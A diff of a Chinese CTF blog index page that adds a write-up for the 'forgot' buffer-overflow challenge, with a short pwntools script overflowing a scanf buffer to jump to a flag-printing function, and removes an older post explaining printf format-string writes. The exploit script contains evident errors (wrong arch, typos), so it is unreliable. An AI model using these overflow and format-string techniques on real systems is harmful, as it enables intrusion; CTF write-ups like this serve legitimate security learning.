@@ -121,7 +121,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">38</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">39</span></a>
 
   </li>
   </ul>
@@ -147,6 +147,82 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/11/AD-forgot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="带废物">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="全宇宙最蒻的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/11/AD-forgot/" class="post-title-link" itemprop="url">AD_forgot</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-11 17:46:36" itemprop="dateCreated datePublished" datetime="2021-04-11T17:46:36+08:00">2021-04-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-18 22:25:55" itemprop="dateModified" datetime="2021-04-18T22:25:55+08:00">2021-04-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><code>RELRO:    Partial RELRO</code><br><code>Stack:    No canary found</code><br><code>NX:       NX enabled</code><br><code>PIE:      No PIE (0x8048000)</code></p>
+<p>目前所学所有攻击手法均需要有输入漏洞<br>本题有两个入口<br>第二个入口可产生数据溢出<br><code>char v2[32]; // [esp+10h] [ebp-74h]</code><br><code>__isoc99_scanf(&quot;%s&quot;, v2);</code><br>v2真正大小只有：32个字节，即ebp-74到ebp-54</p>
+<p>在从后往前分析一下：</p>
+<p>找到一个system函数可用，但没有关键字符串可用，或许可以自己构造</p>
+<p>又找到一个函数，几乎可以确定为目标函数<br>int sub_80486CC()<br>{<br>​    char s; // [esp+1Eh] [ebp-3Ah]<br>​    snprintf(&amp;s, 0x32u, “cat %s”, “./flag”);<br>​    return system(&amp;s);<br>}<br>  目标函数首地址为：0x080486CC</p>
+<p>找到一个反编译失败函数，地址：0x8048A61</p>
+<img src="/2021/04/11/AD-forgot/1.png" class>
+<p><code>(*(&amp;v3 + --v14))();</code></p>
+<p>取v3函数的地址，对其进行偏移，得到一个新的地址，调用这个函数</p>
+<p>第一想法是用这里直接TM的偏移到目标函数，试一试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">&quot;a&quot;</span>+p32(<span class="number">-238</span>)+p32(<span class="number">0x80486CC</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interative()</span><br><span class="line"><span class="comment"># 骗分过样例，暴力出奇迹</span></span><br></pre></td></tr></table></figure>
+<p>但是攻防世界网站又炸了，我是它爹</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -883,159 +959,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/31/AD-CGfsb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="带废物">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="全宇宙最蒻的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/31/AD-CGfsb/" class="post-title-link" itemprop="url">AD_CGfsb</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-12-31 16:04:37" itemprop="dateCreated datePublished" datetime="2020-12-31T16:04:37+08:00">2020-12-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-05 19:07:57" itemprop="dateModified" datetime="2021-02-05T19:07:57+08:00">2021-02-05</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <img src="/2020/12/31/AD-CGfsb/1.png" class>
-<p>得到信息：<br>32位程序<br>Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell<br>开启了栈溢出保护<br>PIE未开启，在编译时将程序编译为位置相关，程序运行时各个段（如代码但等）加载的虚拟地址确定</p>
-<p><strong>printf与%n</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;01234568789%n&quot;</span>,b); <span class="comment">//%n将之前输出的字符个数存入b，同时不输出字符串</span></span><br></pre></td></tr></table></figure>
-<p>%n前面写了10个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入10。<br>%10$n，与%n类似，不过是向[ESP + 10]处指向的内存处写入7。</p>
-<p><strong>关于fgets</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a;</span><br><span class="line">fgets(a,<span class="number">10</span>,<span class="built_in">stdin</span>);<span class="comment">//从键盘输入中获取数据，当读取 (10-1) 个字符时，或者读取到换行符时停止</span></span><br><span class="line"><span class="comment">//如果成功，该函数返回相同的 a 参数。</span></span><br><span class="line"><span class="comment">//如果到达文件末尾或者没有读取到任何字符，a 的内容保持不变，并返回一个空指针。如果发生错误，返回一个空指针。</span></span><br><span class="line">fp = fopen(<span class="string">&quot;file.txt&quot;</span> , <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;perror(<span class="string">&quot;打开文件时发生错误&quot;</span>);<span class="keyword">return</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>( fgets (str, <span class="number">60</span>, fp)!=<span class="literal">NULL</span> ) &#123;...&#125;<span class="comment">//从文件中获取数据</span></span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line">fgets(&amp;c,<span class="number">100</span>,<span class="built_in">stdin</span>);<span class="comment">//改写c的地址</span></span><br></pre></td></tr></table></figure>
-<p><strong>堆栈中的printf函数</strong></p>
-<p>printf(“format”,输出表列)<br>format意思是格式化字符串</p>
-<p>printf函数右序进栈</p>
-<p>printf 函数有一个 bug 就是当 format 字符串中所需要替换的参数数量，多于提供的参数数量，就会产生任意地址读漏洞。<br>例如，printf(“abcde%X %p %x %x”, a, b, c)这句命令中，format 需要 4 个参数，我们只提供了 3 个，所以 printf就会在栈上延续读取数据作为其参数。<br>如下所示，位于栈上的数据“我是你爹”由于挨着参数 3，在 printf 函数需要的参数不够时，被认作为 printf所缺的参数读取了</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">地址</th>
-<th style="text-align:center">栈</th>
-<th style="text-align:center">内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">高地址</td>
-<td style="text-align:center">返回地址</td>
-<td style="text-align:center">不晓得</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">EBP</td>
-<td style="text-align:center">某个指针，不晓得</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">main函数局部变量</td>
-<td style="text-align:center">保存用</td>
-</tr>
-<tr>
-<td style="text-align:center">0x12</td>
-<td style="text-align:center">format字符串</td>
-<td style="text-align:center">abcde%X %p %x %x</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">main函数局部变量</td>
-<td style="text-align:center">不晓得为什么有两个</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">printf参数：我是你爹</td>
-<td style="text-align:center">%x形式读取，可能是来自main的某个局部变量</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">printf参数：参数3</td>
-<td style="text-align:center">%x形式读取</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">printf参数：参数2</td>
-<td style="text-align:center">%p形式读取</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">printf参数：参数1</td>
-<td style="text-align:center">%X形式读取</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">printf参数：format地址</td>
-<td style="text-align:center">0x12</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">返回地址</td>
-<td style="text-align:center">不晓得为什么有两个</td>
-</tr>
-<tr>
-<td style="text-align:center">低地址</td>
-<td style="text-align:center">printf母函数EBP</td>
-<td style="text-align:center">不晓得</td>
-</tr>
-</tbody>
-</table>
-</div>
-<img src="/2020/12/31/AD-CGfsb/2.png" class>
-<p>由上图计算出<strong>format字符串</strong>距离<strong>format地址</strong>的偏移量是10。<br>在32位运行时堆栈中，ESP 寄存器存放的是堆栈中某个位置的 32 位偏移量，相当于每4个字节1偏移量。</p>
-<img src="/2020/12/31/AD-CGfsb/3.png" class>
-<p>DB定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1<br>DW定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2<br>DD定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4<br>pwnme的地址为0x0804A068，是一个字节的double word。p32函数将pwnme地址转化成了四个字节的小端序字符。c语言中，char类型，一个字符占一个字节，故一般意义上的字符数相当于字节数。</p>
-<p>完结撒花</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1105,7 +1028,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-count">39</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
